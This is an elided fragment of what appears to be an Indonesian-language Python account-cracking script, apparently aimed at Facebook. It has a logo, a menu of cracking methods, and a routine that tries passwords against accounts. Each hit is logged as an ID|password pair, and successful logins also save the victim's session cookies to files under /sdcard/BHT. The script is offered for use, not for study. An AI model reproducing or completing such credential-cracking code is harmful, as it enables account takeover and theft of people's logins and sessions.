...
def logo():
	...
	print ("""       ______   _        _______  _______  _                
...
def setting():
	...
	print('') 
	cetak(nel('[bold yellow]➣1. BHT Old \n➣2. BHT New\n➣3. Random [bold yellow]'))
	print('')
	hu = input('➥➥➣Pilih : ')
	if hu in ['1','01']:
...
def passwrd():
	...
	print('')
	print(f'➥➥➣BHT {h}OK{u} Tersimpan Di : {h}OK/%s {b}'%(okc))
	print(f'➥➥➣BHT {k}CP{h} Tersimpan Di : {k}CP/%s {b}'%(cpc))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/BHT/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/BHT/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
